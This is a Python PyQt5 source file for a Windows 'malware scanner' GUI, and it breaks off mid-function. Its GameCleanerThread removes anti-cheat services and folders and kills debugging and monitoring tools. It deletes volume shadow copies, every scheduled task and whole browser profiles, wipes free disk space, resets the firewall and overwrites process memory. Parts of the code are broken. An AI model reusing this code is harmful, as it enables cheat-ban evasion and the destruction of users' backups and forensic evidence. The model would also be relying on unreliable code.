from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                            QPushButton, QTextEdit, QProgressBar, QMessageBox,
                            QDialog, QCheckBox, QDialogButtonBox, QLabel)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
import sys
import io
from contextlib import redirect_stdout
from malware_scanner import MalwareScanner
import winreg
import shutil
import os
from subprocess import run, PIPE
from psutil import process_iter
from winreg import HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER, HKEY_USERS
import hashlib
import socket
import concurrent.futures
import yara  # For malware pattern matching
import pefile  # For PE file analysis
import time
import psutil
import threading
from collections import defaultdict
import requests  # For virus total integration
import threading
from queue import Queue
import random
import string
import ctypes
from datetime import datetime
import glob
import subprocess
import fnmatch

class OutputRedirector(io.StringIO):
    def __init__(self, signal_handler):
        super().__init__()
        self.signal_handler = signal_handler

    def write(self, text):
        if text.strip():  # Only emit non-empty strings
            self.signal_handler.emit(text)

    def flush(self):
        pass

class CustomScanDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Custom Scan Options")
        self.setModal(True)
        
        layout = QVBoxLayout(self)
        
        # Warning label at the top
        warning_label = QLabel(
            "⚠️ Options in red are aggressive and may affect system stability!"
        )
        warning_label.setStyleSheet("color: #ff5555; font-weight: bold; padding: 5px;")
        layout.addWidget(warning_label)
        
        # Create checkboxes for scan options with warnings
        self.options = {
            "drive_scan": {
                "text": "1. Full Drive Scan",
                "aggressive": False,
                "warning": None
            },
            "process": {
                "text": "2. Process Scan",
                "aggressive": False,
                "warning": None
            },
            "memory": {
                "text": "3. Memory Scan",
                "aggressive": False,
                "warning": None
            },
            "registry": {
                "text": "4. Registry Scan",
                "aggressive": True,
                "warning": "May remove important registry keys"
            },
            "network": {
                "text": "5. Network Scan",
                "aggressive": False,
                "warning": None
            },
            "rootkit": {
                "text": "6. Rootkit Scan",
                "aggressive": False,
                "warning": None
            },
            "directory": {
                "text": "7. Directory Scan",
                "aggressive": False,
                "warning": None
            },
            "cleanup": {
                "text": "8. Trace Cleanup",
                "aggressive": True,
                "warning": "Will delete system and application logs"
            },
            "network_reset": {
                "text": "9. Reset Network Adapters",
                "aggressive": True,
                "warning": "Will temporarily disconnect internet"
            },
            "cache_clear": {
                "text": "10. Clear All System Cache",
                "aggressive": True,
                "warning": "May affect application performance"
            },
            "memory_dump": {
                "text": "11. Memory Dump Analysis",
                "aggressive": True,
                "warning": "High memory usage, may cause system slowdown"
            },
            "scheduled_tasks": {
                "text": "12. Scheduled Task Scan",
                "aggressive": True,
                "warning": "May remove legitimate scheduled tasks"
            },
            "alt_streams": {
                "text": "13. Alternate Data Stream Scan",
                "aggressive": False,
                "warning": None
            },
            "drivers": {
                "text": "14. Driver Verification",
                "aggressive": True,
                "warning": "May disable some drivers"
            },
            "usb_monitor": {
                "text": "15. USB Drive Monitoring",
                "aggressive": False,
                "warning": None
            }
        }
        
        # Create and add checkboxes with warnings
        self.checkboxes = {}
        for key, option in self.options.items():
            container = QWidget()
            container_layout = QVBoxLayout(container)
            container_layout.setContentsMargins(0, 0, 0, 0)
            container_layout.setSpacing(0)
            
            # Create checkbox
            checkbox = QCheckBox(option['text'])
            checkbox.setChecked(True)
            
            # Style aggressive options
            if option['aggressive']:
                checkbox.setStyleSheet("""
                    QCheckBox {
                        color: #ff5555;
                        font-weight: bold;
                    }
                """)
                
                # Add warning if exists
                if option['warning']:
                    warning = QLabel(f"⚠️ {option['warning']}")
                    warning.setStyleSheet("""
                        color: #ff5555;
                        font-size: 10px;
                        padding-left: 20px;
                    """)
                    container_layout.addWidget(checkbox)
                    container_layout.addWidget(warning)
                else:
                    container_layout.addWidget(checkbox)
            else:
                container_layout.addWidget(checkbox)
            
            layout.addWidget(container)
            self.checkboxes[key] = checkbox
        
        # Add warning label for aggressive options
        aggressive_warning = QLabel(
            "\nWarning: Aggressive options (in red) will make significant "
            "system changes and may:\n"
            "• Require system restart\n"
            "• Break some applications\n"
            "• Require software reinstallation\n"
            "• Affect system performance\n"
            "Use with caution!"
        )
        aggressive_warning.setStyleSheet("""
            color: #ff5555;
            background-color: rgba(255, 85, 85, 0.1);
            padding: 10px;
            border-radius: 5px;
            margin: 10px;
        """)
        layout.addWidget(aggressive_warning)
        
        # Add OK/Cancel buttons
        button_box = QDialogButtonBox(
            QDialogButtonBox.Ok | QDialogButtonBox.Cancel
        )
        button_box.accepted.connect(self.accept)
        button_box.rejected.connect(self.reject)
        layout.addWidget(button_box)

    def get_selected_options(self):
        return [k for k, v in self.checkboxes.items() if v.isChecked()]

class ScannerThread(QThread):
    progress = pyqtSignal(str)
    finished = pyqtSignal(list)
    
    def __init__(self, scan_type, custom_options=None):
        super().__init__()
        self.scan_type = scan_type
        self.custom_options = custom_options
        self.scanner = MalwareScanner()
        self.redirector = OutputRedirector(self.progress)
        
    def run(self):
        try:
            with redirect_stdout(self.redirector):
                if self.scan_type == "quick":
                    results = self.scanner.quick_scan()
                elif self.scan_type == "full":
                    results = self.scanner.full_scan()
                elif self.scan_type == "custom":
                    results = self.scanner.custom_scan(self.custom_options)
                self.finished.emit(results or [])
        except Exception as e:
            self.progress.emit(f"Error: {str(e)}")
            self.finished.emit([])

class SystemInfoWindow(QDialog):
    def __init__(self, parent, system_info):
        super().__init__(parent)
        self.setWindowTitle("System Information")
        self.setGeometry(100, 100, 600, 400)
        
        # Set window background color
        self.setStyleSheet("""
            QDialog {
                background-color: #121212;
            }
        """)
        
        layout = QVBoxLayout(self)
        
        # Update text area styling
        self.text_area = QTextEdit()
        self.text_area.setReadOnly(True)
        self.text_area.setStyleSheet("""
            QTextEdit {
                background-color: #1E1E1E;
                color: #B39DDB;
                border: 1px solid #424242;
                border-radius: 4px;
                padding: 8px;
                font-family: Consolas, Monaco, monospace;
                font-size: 12px;
            }
        """)
        
        # Insert the system information
        self.text_area.setText(system_info)
        layout.addWidget(self.text_area)
        
        # Update close button styling
        close_button = QPushButton("Close")
        close_button.clicked.connect(self.close)
        close_button.setStyleSheet("""
            QPushButton {
                background-color: #7E57C2;
                color: #FFFFFF;
                padding: 8px;
                font-size: 14px;
                border-radius: 4px;
                min-height: 30px;
                border: none;
            }
            QPushButton:hover {
                background-color: #9575CD;
            }
        """)
        layout.addWidget(close_button)

class SystemBackup:
    def __init__(self):
        self.backup_path = os.path.join(os.environ['TEMP'], 'system_backup_' + datetime.now().strftime('%Y%m%d_%H%M%S'))
        self.registry_backup = {}
        self.file_backups = []

    def backup_registry_key(self, key_path, hive):
        """Backup a registry key and its values"""
        try:
            backup_data = {}
            with winreg.OpenKey(hive, key_path, 0, winreg.KEY_READ) as key:
                i = 0
                while True:
                    try:
                        name, value, type_ = winreg.EnumValue(key, i)
                        backup_data[name] = (value, type_)
                        i += 1
                    except WindowsError:
                        break
            self.registry_backup[f"{hive}\\{key_path}"] = backup_data
            return True
        except:
            return False

    def backup_file(self, file_path):
        """Create backup of a file"""
        try:
            if os.path.exists(file_path):
                backup_file = os.path.join(self.backup_path, os.path.basename(file_path))
                os.makedirs(os.path.dirname(backup_file), exist_ok=True)
                shutil.copy2(file_path, backup_file)
                self.file_backups.append((file_path, backup_file))
                return True
        except:
            return False
        return False

    def restore_all(self):
        """Restore all backed up files and registry keys"""
        # Restore registry keys
        for key_path, values in self.registry_backup.items():
            try:
                hive, path = key_path.split('\\', 1)
                with winreg.OpenKey(hive, path, 0, winreg.KEY_WRITE) as key:
                    for name, (value, type_) in values.items():
                        winreg.SetValueEx(key, name, 0, type_, value)
            except:
                continue

        # Restore files
        for original, backup in self.file_backups:
            try:
                if os.path.exists(backup):
                    shutil.copy2(backup, original)
            except:
                continue

class ProgressTracker:
    def __init__(self, total_steps):
        self.total_steps = total_steps
        self.current_step = 0
        self.start_time = None
        self.step_times = {}

    def start(self):
        self.start_time = time.time()

    def update(self, step_name):
        self.current_step += 1
        self.step_times[step_name] = time.time()
        return (self.current_step / self.total_steps) * 100

    def get_eta(self):
        if not self.start_time or len(self.step_times) < 2:
            return "Calculating..."
        
        avg_step_time = (time.time() - self.start_time) / len(self.step_times)
        steps_remaining = self.total_steps - self.current_step
        eta_seconds = avg_step_time * steps_remaining
        
        return f"{eta_seconds:.0f} seconds"

class GameCleanerThread(QThread):
    progress = pyqtSignal(str)
    progress_update = pyqtSignal(int)  # New signal for progress bar
    error_occurred = pyqtSignal(str)   # New signal for error handling
    finished = pyqtSignal(bool)
    
    def __init__(self):
        super().__init__()
        self.anticheat_services = [
            "BEService",          # BattlEye
            "EasyAntiCheat",     # EAC
            "PnkBstrA",          # PunkBuster
            "vgk",               # Vanguard
            "faceit",            # FACEIT
            "ESEA",              # ESEA
            "mhyprot2",          # HyperVisor
            "xhunter1",          # Xigncode3
            "ACE",               # Anti-Cheat Expert
        ]
        
        self.anticheat_folders = [
            r"C:\Program Files (x86)\Common Files\BattlEye",
            r"C:\Program Files (x86)\EasyAntiCheat",
            r"C:\Program Files\Riot Vanguard",
            r"C:\Program Files (x86)\FACEIT",
            r"C:\Program Files\FACEIT",
            r"C:\Program Files\Common Files\WEGAME",
        ]
        
        self.registry_keys = [
            r"SOFTWARE\WOW6432Node\EasyAntiCheat",
            r"SOFTWARE\WOW6432Node\BattlEye",
            r"SOFTWARE\Riot Games",
            r"SOFTWARE\FACEIT",
            r"SOFTWARE\Valve\Steam\Apps",  # Steam games
        ]
        
        # Add known malicious process names
        self.suspicious_processes = [
            "cheatengine",
            "processhacker",
            "wireshark",
            "fiddler",
            "ida64",
            "ollydbg",
            "x64dbg",
            "ghidra",
            "dnspy",
            "pestudio",
            "procmon",
            "tcpview",
            "autoruns",
            "processhacker",
            "regshot",
        ]
        
        # Add additional registry locations to check
        self.additional_registry_keys = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunServiceOnce",
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit",
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
            r"SYSTEM\CurrentControlSet\Services",
            r"SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs",
        ]
        
        # Add suspicious file extensions
        self.suspicious_extensions = [
            '.dll', '.sys', '.exe', '.bin', '.dat', '.log', '.tmp'
        ]
        
        # Add additional folders to scan
        self.additional_scan_paths = [
            os.path.join(os.environ['SYSTEMROOT'], 'Prefetch'),
            os.path.join(os.environ['SYSTEMROOT'], 'Temp'),
            os.path.join(os.environ['SYSTEMROOT'], 'System32', 'drivers'),
            os.path.join(os.environ['PROGRAMDATA']),
            os.path.join(os.environ['APPDATA']),
            os.path.join(os.environ['LOCALAPPDATA']),
        ]
        
        # Add common game launcher paths
        self.launcher_paths = [
            r"Program Files (x86)\Steam",
            r"Program Files\Epic Games",
            r"Program Files\Riot Games",
            r"Program Files (x86)\Origin",
            r"Program Files\Battle.net",
            r"Program Files (x86)\Ubisoft",
            r"ProgramData\Battle.net",
            r"ProgramData\Electronic Arts",
        ]
        
        # Add common game file patterns
        self.game_file_patterns = [
            'battleye*.dll', 'easyanticheat*.dll', 'vanguard*.sys',
            'anticheatsdk*.dll', 'xigncode*.dll', 'hackshield*.dll',
            'gameguard*.dll', 'pgguard*.dll', 'aclient*.dll',
            '*.log', '*.dmp', 'crash*.txt', 'debug*.log',
            'anticheat*.db', 'anticheat*.dat', '*.vac',
        ]
        
        # Add registry value patterns
        self.registry_patterns = [
            'anticheat', 'battleye', 'easyanticheat', 'vanguard',
            'faceit', 'valve', 'steam', 'origin', 'epic', 'riot',
            'game', 'hack', 'cheat', 'guard', 'shield'
        ]

        self.backup = SystemBackup()
        self.progress_tracker = None
        self.error_count = 0
        self.max_errors = 3  # Maximum number of errors before stopping
        
    def show_warning(self):
        """Show detailed warning about changes"""
        warning_text = """
        WARNING: This tool will make the following system changes:
        
        1. Registry Modifications:
           - Remove anti-cheat related registry keys
           - Modify system configuration entries
           - Clean application traces
        
        2. File System Changes:
           - Delete anti-cheat related files
           - Remove system logs and cache
           - Clean prefetch data
        
        3. System Services:
           - Stop and remove anti-cheat services
           - Modify system services configuration
        
        4. Memory Changes:
           - Clear process memory
           - Remove loaded modules
        
        5. Network Changes:
           - Reset network adapters
           - Clear network cache
        
        These changes:
        • Cannot be undone without backup restoration
        • May require system restart
        • Could cause some games to require reinstallation
        • Might trigger system integrity checks
        
        A backup will be created before making changes.
        """
        return warning_text

    def create_backup(self):
        """Create system backup before changes"""
        self.progress.emit("Creating system backup...")
        
        # Backup registry keys
        for key in self.registry_keys:
            if self.backup.backup_registry_key(key, winreg.HKEY_LOCAL_MACHINE):
                self.progress.emit(f"Backed up registry key: {key}")
        
        # Backup important files
        for folder in self.anticheat_folders:
            if os.path.exists(folder):
                for root, _, files in os.walk(folder):
                    for file in files:
                        file_path = os.path.join(root, file)
                        if self.backup.backup_file(file_path):
                            self.progress.emit(f"Backed up file: {file_path}")

    def handle_error(self, operation, error):
        """Handle errors during cleanup"""
        self.error_count += 1
        error_msg = f"Error during {operation}: {str(error)}"
        self.error_occurred.emit(error_msg)
        
        if self.error_count >= self.max_errors:
            self.progress.emit("\nToo many errors occurred. Starting recovery...")
            self.recover_from_errors()
            return False
        return True

    def recover_from_errors(self):
        """Attempt to recover from errors"""
        self.progress.emit("Starting recovery process...")
        
        try:
            # Restore backups
            self.backup.restore_all()
            self.progress.emit("Restored system backup")
            
            # Reset system services
            subprocess.run("net start", shell=True, capture_output=True)
            self.progress.emit("Reset system services")
            
            # Clear temporary changes
            self.clean_temp_files()
            self.progress.emit("Cleaned temporary files")
            
        except Exception as e:
            self.progress.emit(f"Recovery failed: {str(e)}")

    def terminate_suspicious_processes(self):
        self.progress.emit("\nScanning for suspicious processes...")
        for proc in process_iter(['pid', 'name', 'username']):
            try:
                proc_name = proc.info['name'].lower()
                if any(susp in proc_name for susp in self.suspicious_processes):
                    proc.kill()
                    self.progress.emit(f"Terminated suspicious process: {proc_name}")
            except:
                continue

    def check_network_connections(self):
        self.progress.emit("\nChecking network connections...")
        suspicious_connections = []
        for conn in socket.socket(socket.AF_INET, socket.SOCK_STREAM).getsockname():
            try:
                if conn.status == "ESTABLISHED":
                    suspicious_connections.append(f"{conn.laddr}:{conn.raddr}")
            except:
                continue
        if suspicious_connections:
            self.progress.emit("Found suspicious network connections:")
            for conn in suspicious_connections:
                self.progress.emit(f"- {conn}")

    def deep_scan_files(self, directory):
        self.progress.emit(f"\nDeep scanning directory: {directory}")
        known_malicious_hashes = set()  # Add known malicious file hashes here
        
        for root, _, files in os.walk(directory):
            for file in files:
                try:
                    file_path = os.path.join(root, file)
                    if any(file.lower().endswith(ext) for ext in self.suspicious_extensions):
                        # Calculate file hash
                        with open(file_path, 'rb') as f:
                            file_hash = hashlib.sha256(f.read()).hexdigest()
                            
                        # Check against known malicious hashes
                        if file_hash in known_malicious_hashes:
                            try:
                                os.remove(file_path)
                                self.progress.emit(f"Removed malicious file: {file_path}")
                            except:
                                self.progress.emit(f"Failed to remove file: {file_path}")
                except:
                    continue

    def clean_scheduled_tasks(self):
        self.progress.emit("\nCleaning scheduled tasks...")
        try:
            run("schtasks /Delete /F /TN *", shell=True, stdout=PIPE, stderr=PIPE)
            self.progress.emit("Removed suspicious scheduled tasks")
        except:
            self.progress.emit("Failed to clean scheduled tasks")

    def reset_network_settings(self):
        self.progress.emit("\nResetting network settings...")
        commands = [
            "ipconfig /release",
            "ipconfig /flushdns",
            "ipconfig /renew",
            "netsh winsock reset",
            "netsh int ip reset",
            "netsh advfirewall reset"
        ]
        for cmd in commands:
            try:
                run(cmd, shell=True, stdout=PIPE, stderr=PIPE)
                self.progress.emit(f"Executed: {cmd}")
            except:
                continue

    def clean_browser_data(self):
        self.progress.emit("\nCleaning browser data...")
        browser_paths = [
            os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data'),
            os.path.join(os.environ['LOCALAPPDATA'], 'Mozilla', 'Firefox', 'Profiles'),
            os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data'),
        ]
        
        for path in browser_paths:
            try:
                if os.path.exists(path):
                    shutil.rmtree(path)
                    self.progress.emit(f"Cleaned browser data: {path}")
            except:
                continue

    def clean_services(self):
        self.progress.emit("Stopping and removing anti-cheat services...")
        for service in self.anticheat_services:
            try:
                # Stop service
                run(f"sc stop {service}", shell=True, stdout=PIPE, stderr=PIPE)
                # Delete service
                run(f"sc delete {service}", shell=True, stdout=PIPE, stderr=PIPE)
                self.progress.emit(f"Removed service: {service}")
            except Exception as e:
                self.progress.emit(f"Error removing service {service}: {str(e)}")

    def clean_folders(self):
        self.progress.emit("\nRemoving anti-cheat folders...")
        for folder in self.anticheat_folders:
            try:
                if os.path.exists(folder):
                    shutil.rmtree(folder)
                    self.progress.emit(f"Removed folder: {folder}")
            except Exception as e:
                self.progress.emit(f"Error removing folder {folder}: {str(e)}")

    def clean_registry(self):
        self.progress.emit("\nCleaning registry entries...")
        for key_path in self.registry_keys:
            try:
                # Try both HKLM and HKCU
                for root_key in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
                    try:
                        winreg.DeleteKey(root_key, key_path)
                        self.progress.emit(f"Removed registry key: {key_path}")
                    except WindowsError:
                        continue
            except Exception as e:
                self.progress.emit(f"Error removing registry key {key_path}: {str(e)}")

    def clean_temp_files(self):
        self.progress.emit("\nCleaning temporary files...")
        temp_paths = [
            os.path.join(os.environ['TEMP']),
            os.path.join(os.environ['LOCALAPPDATA'], 'Temp'),
            os.path.join(os.environ['LOCALAPPDATA'], 'Steam'),
            os.path.join(os.environ['PROGRAMDATA'], 'EasyAntiCheat'),
            os.path.join(os.environ['PROGRAMDATA'], 'BattlEye'),
        ]
        
        for path in temp_paths:
            try:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if any(ac in file.lower() for ac in ['anticheat', 'battle', 'eac', 'vanguard', 'faceit']):
                                try:
                                    os.remove(os.path.join(root, file))
                                    self.progress.emit(f"Removed file: {file}")
                                except:
                                    continue
            except Exception as e:
                self.progress.emit(f"Error cleaning temp files in {path}: {str(e)}")

    def deep_clean_registry(self):
        """Recursively clean registry for game-related entries"""
        def scan_key(key_path, hive):
            try:
                with winreg.OpenKey(hive, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
                    num_subkeys, num_values, _ = winreg.QueryInfoKey(key)
                    
                    # Check values
                    for i in range(num_values):
                        try:
                            name, value, _ = winreg.EnumValue(key, i)
                            if any(pattern in str(name).lower() or pattern in str(value).lower() 
                                  for pattern in self.registry_patterns):
                                winreg.DeleteValue(key, name)
                                self.progress.emit(f"Removed registry value: {key_path}\\{name}")
                        except:
                            continue
                    
                    # Recursively check subkeys
                    for i in range(num_subkeys):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            scan_key(f"{key_path}\\{subkey_name}", hive)
                        except:
                            continue
            except:
                pass

        # Scan common registry locations
        hives = [
            (winreg.HKEY_LOCAL_MACHINE, "HKLM"),
            (winreg.HKEY_CURRENT_USER, "HKCU"),
            (winreg.HKEY_USERS, "HKU")
        ]
        
        for hive, name in hives:
            self.progress.emit(f"\nScanning {name} for game traces...")
            scan_key("SOFTWARE", hive)
            scan_key("SYSTEM", hive)

    def clean_disk_artifacts(self):
        """Clean disk-level artifacts"""
        try:
            # Clean Master File Table (MFT) records
            subprocess.run(
                'cipher /w:C:', shell=True, 
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            
            # Clean volume shadow copies
            subprocess.run(
                'vssadmin delete shadows /all /quiet',
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            
            # Clean system restore points
            subprocess.run(
                'wmic.exe shadowcopy delete',
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
        except:
            pass

    def clean_memory_regions(self):
        """Clean specific memory regions"""
        try:
            import win32api
            import win32security
            import ntsecuritycon as con
            
            # Get debug privilege
            priv_flags = win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
            h_token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), priv_flags)
            priv_id = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
            win32security.AdjustTokenPrivileges(h_token, 0, [(priv_id, con.SE_PRIVILEGE_ENABLED)])
            
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if any(game in proc.info['name'].lower() for game in ['game', 'steam', 'epic', 'riot']):
                        proc_handle = win32api.OpenProcess(
                            win32con.PROCESS_VM_OPERATION | 
                            win32con.PROCESS_VM_READ | 
                            win32con.PROCESS_VM_WRITE,
                            False, proc.info['pid']
                        )
                        
                        # Enumerate and clean memory regions
                        memory_regions = win32process.EnumProcessModules(proc_handle)
                        for region in memory_regions:
                            try:
                                win32process.WriteProcessMemory(proc_handle, region, b'\x00' * 1024, None)
                            except:
                                continue
                except:
                    continue
        except:
            pass

    def clean_file_traces(self):
        """Enhanced file trace cleaning"""
        def secure_delete(file_path, passes=3):
            """Securely delete file with multiple passes"""
            try:
                if os.path.exists(file_path):
                    file_size = os.path.getsize(file_path)
                    with open(file_path, 'wb') as f:
                        for _ in range(passes):
                            f.seek(0)
                            # Write random data
                            f.write(os.urandom(file_size))
                            f.flush()
                            os.fsync(f.fileno())
                    os.remove(file_path)
                    return True
            except:
                return False

        # Scan all drives
        drives = [d.device for d in psutil.disk_partitions() if 'fixed' in d.opts]
        
        for drive in drives:
            for root, _, files in os.walk(drive):
                for file in files:
                    try:
                        if any(fnmatch.fnmatch(file.lower(), pattern.lower()) 
                              for pattern in self.game_file_patterns):
                            file_path = os.path.join(root, file)
                            if secure_delete(file_path):
                                self.progress.emit(f"Securely deleted: {file_path}")
                    except:
                        continue

    def clean_prefetch_advanced(self):
        """Advanced prefetch cleaning"""
        prefetch_dir = os.path.join(os.environ['SYSTEMROOT'], 'Prefetch')
        try:
            # Disable prefetch temporarily
            subprocess.run(
                'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 0 /f',
                shell=True, capture_output=True
            )
            
            # Clean prefetch files
            for file in os.listdir(prefetch_dir):
                if any(game.lower() in file.lower() for game in [
                    'steam', 'epic', 'riot', 'game', 'battle', 'origin'
                ]):
                    try:
                        os.remove(os.path.join(prefetch_dir, file))
                        self.progress.emit(f"Removed prefetch: {file}")
                    except:
                        continue
                        
            # Re-enable prefetch
            subprocess.run(
                'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 3 /f',
                shell=True, capture_output=True
            )
        except:
            pass

    def run(self):
        try:
            # Show warning and create backup
            self.progress.emit(self.show_warning())
            self.create_backup()
            
            # Initialize progress tracking
            total_steps = len(self.anticheat_services) + len(self.anticheat_folders) + \
                         len(self.registry_keys) + 5  # +5 for additional operations
            self.progress_tracker = ProgressTracker(total_steps)
            self.progress_tracker.start()
            
            # Run cleanup operations with progress tracking and error handling
            operations = [
                ("registry cleaning", self.deep_clean_registry),
                ("disk artifacts", self.clean_disk_artifacts),
                ("memory regions", self.clean_memory_regions),
                ("file traces", self.clean_file_traces),
                ("prefetch", self.clean_prefetch_advanced)
            ]
            
            for operation_name, operation_func in operations:
                try:
                    self.progress.emit(f"\nStarting {operation_name}...")
                    operation_func()
                    progress = self.progress_tracker.update(operation_name)
                    self.progress_update.emit(int(progress))
                    self.progress.emit(f"Estimated time remaining: {self.progress_tracker.get_eta()}")
                except Exception as e:
                    if not self.handle_error(operation_name, e):
                        self.finished.emit(False)
                        return
            
            self.progress.emit("\nCleanup completed successfully!")
            self.finished.emit(True)
            
        except Exception as e:
            self.handle_error("cleanup", e)
            self.finished.emit(False)

class EnhancedScannerThread(QThread):
    def __init__(self):
        super().__init__()
        # Add VirusTotal API key
        self.vt_api_key = "YOUR_VIRUSTOTAL_API_KEY"
        
        # Add YARA rules for malware detection
        self.yara_rules = """
            rule SuspiciousPatterns {
                strings:
                    $injection = "VirtualAllocEx"
                    $keylogger = "GetAsyncKeyState"
                    $process_hollow = "NtUnmapViewOfSection"
                    $suspicious_apis = "CreateRemoteThread"
                    $anti_debug = "IsDebuggerPresent"
                condition:
                    any of them
            }
        """
        
        # Add memory scanning patterns
        self.memory_patterns = [
            rb"hack",
            rb"cheat",
            rb"inject",
            rb"memory",
            # Add more patterns
        ]
        
        # Initialize thread pool
        self.thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=4)
        self.scan_queue = Queue()
        
        # Add rootkit detection patterns
        self.rootkit_patterns = {
            'hidden_processes': [
                'rootkit', 'backdoor', 'keylog', 'stealth',
                'hide', 'hook', 'inject', 'patch'
            ],
            'hidden_files': [
                '.hid', '.sys', '.root', '.kit',
                'winlogon.', 'svchost.', 'explorer.'
            ],
            'suspicious_ports': [
                4444, 5555, 6666, 7777, 8888, 9999  # Common backdoor ports
            ]
        }
        
        # Add signature database
        self.malware_signatures = {
            'ransomware': [
                rb'encrypt', rb'decrypt', rb'bitcoin', rb'ransom',
                rb'.locked', rb'.crypt', rb'.encrypted'
            ],
            'trojan': [
                rb'backdoor', rb'remote', rb'control', rb'access',
                rb'keylog', rb'capture'
            ],
            'rootkit': [
                rb'hook', rb'patch', rb'inject', rb'hide',
                rb'stealth', rb'root'
            ]
        }

    def monitor_system_resources(self):
        """Monitor system resource usage during scan"""
        while not hasattr(self, '_stop_monitoring'):
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk_io = psutil.disk_io_counters()
            
            self.progress.emit(
                f"\nSystem Monitor:"
                f"\nCPU Usage: {cpu_percent}%"
                f"\nMemory Usage: {memory.percent}%"
                f"\nDisk Read: {disk_io.read_bytes/1024/1024:.2f} MB"
                f"\nDisk Write: {disk_io.write_bytes/1024/1024:.2f} MB"
            )
            time.sleep(2)

    def check_hidden_processes(self):
        """Detect potentially hidden processes"""
        visible_processes = set(p.name().lower() for p in psutil.process_iter(['name']))
        wmi_processes = set()
        
        try:
            import wmi
            c = wmi.WMI()
            wmi_processes = set(p.Name.lower() for p in c.Win32_Process())
            
            # Compare process lists
            hidden = wmi_processes - visible_processes
            if hidden:
                self.progress.emit(f"\nPotentially hidden processes found: {hidden}")
        except:
            pass

    def scan_alternate_data_streams(self):
        """Scan for suspicious alternate data streams"""
        def check_ads(file_path):
            try:
                import win32file
                import win32api
                streams = win32file.FindStreams(file_path)
                if len(streams) > 1:  # More than just the main stream
                    return True, len(streams)
                return False, 0
            except:
                return False, 0

        for path in self.additional_scan_paths:
            for root, _, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    has_ads, count = check_ads(file_path)
                    if has_ads:
                        self.progress.emit(
                            f"Found {count} alternate data streams in: {file_path}"
                        )

    def deep_memory_scan(self):
        """Perform deep memory analysis"""
        suspicious_patterns = defaultdict(list)
        
        for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
            try:
                # Check process memory usage
                mem_info = proc.memory_info()
                if mem_info.rss > 500 * 1024 * 1024:  # More than 500MB
                    suspicious_patterns['high_memory'].append(
                        f"{proc.name()} (PID: {proc.pid}) - {mem_info.rss/1024/1024:.2f} MB"
                    )
                
                # Check for suspicious DLLs
                for dll in proc.memory_maps():
                    if any(pattern in dll.path.lower() for pattern in self.rootkit_patterns['hidden_files']):
                        suspicious_patterns['suspicious_dlls'].append(
                            f"{proc.name()} loaded suspicious DLL: {dll.path}"
                        )
            except:
                continue
        
        return suspicious_patterns

    def check_file_with_virustotal(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                file_hash = hashlib.sha256(f.read()).hexdigest()
            
            headers = {
                'x-apikey': self.vt_api_key
            }
            response = requests.get(
                f'https://www.virustotal.com/vtapi/v2/file/report?apikey={self.vt_api_key}&resource={file_hash}',
                headers=headers
            )
            
            if response.status_code == 200:
                result = response.json()
                if result['positives'] > 0:
                    return True, f"VirusTotal detections: {result['positives']}/{result['total']}"
            return False, None
        except:
            return False, None

    def analyze_pe_file(self, file_path):
        try:
            pe = pefile.PE(file_path)
            suspicious = []
            
            # Check for suspicious sections
            for section in pe.sections:
                if section.Characteristics & 0xE0000000:  # Check for executable + writable
                    suspicious.append(f"Suspicious section: {section.Name}")
            
            # Check for suspicious imports
            suspicious_imports = [
                "VirtualAlloc", "WriteProcessMemory", "CreateRemoteThread",
                "LoadLibrary", "GetProcAddress", "ReadProcessMemory"
            ]
            
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                for imp in entry.imports:
                    if imp.name and any(susp in imp.name.decode() for susp in suspicious_imports):
                        suspicious.append(f"Suspicious import: {imp.name.decode()}")
            
            return suspicious
        except:
            return []

    def deep_scan_files(self, directory):
        self.progress.emit(f"\nDeep scanning directory: {directory}")
        
        # Compile YARA rules
        rules = yara.compile(source=self.yara_rules)
        
        def scan_file(file_path):
            try:
                # YARA scan
                matches = rules.match(file_path)
                if matches:
                    return f"YARA match in {file_path}: {matches}"
                
                # PE file analysis
                if file_path.lower().endswith('.exe'):
                    suspicious = self.analyze_pe_file(file_path)
                    if suspicious:
                        return f"Suspicious PE file {file_path}: {suspicious}"
                
                # VirusTotal check
                vt_match, vt_info = self.check_file_with_virustotal(file_path)
                if vt_match:
                    return f"VirusTotal detection for {file_path}: {vt_info}"
                
                return None
            except:
                return None

        # Use thread pool for parallel scanning
        futures = []
        for root, _, files in os.walk(directory):
